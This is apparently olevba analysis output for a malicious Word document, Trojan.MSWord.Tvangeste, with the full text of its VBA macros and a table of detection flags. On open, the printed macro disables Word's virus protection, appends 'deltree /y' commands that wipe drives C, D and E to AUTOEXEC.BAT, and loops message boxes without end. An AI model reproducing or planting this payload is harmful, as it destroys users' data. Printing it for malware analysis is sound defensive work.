olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Tvangeste
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Tvangeste - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Tvangeste - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    With Options
        .VirusProtection = False
    End With
    Application.DisplayRecentFiles = False
MsgBox "World War starting now!"
    Application.Run MacroName:="WorldWar"
End Sub
Sub WorldWar()
    Documents.Open FileName:="AUTOEXEC.BAT", ConfirmConversions:=False, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="deltree /y e:\ >nul "
    Selection.TypeParagraph
    Selection.TypeText Text:="deltree /y d:\ >nul "
    Selection.TypeParagraph
    Selection.TypeText Text:="deltree /y c:\ >nul "
    ActiveDocument.Save
    ActiveDocument.Close
    Application.Run MacroName:="NATO"
End Sub
Sub NATO()
MsgBox "3rd World War"
    Application.Run MacroName:="USA"
End Sub
Sub USA()
MsgBox "3rd World War"
    Application.Run MacroName:="Info"
End Sub
Sub Info()
Dim Msg, Style, Title, Help, Ctxt, Response, MyString
Msg = "3rd World War"
Style = vbYesOk + vbCritical + vbDefaultButton2
Title = "Tvangeste v 1.0"
Help = "DEMO.HLP"
Ctxt = 1000
Response = MsgBox(Msg, Style, Title, Help, Ctxt)
If Response = vbYes Then
    MyString = "Да"
Else
    MyString = "Нет"
End If
    Application.Run MacroName:="Germany"
End Sub
Sub Germany()
MsgBox "3rd World War"
    Application.Run MacroName:="GermanyB"
End Sub
Sub GermanyB()
MsgBox "3rd World War"
    Application.Run MacroName:="Germany"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

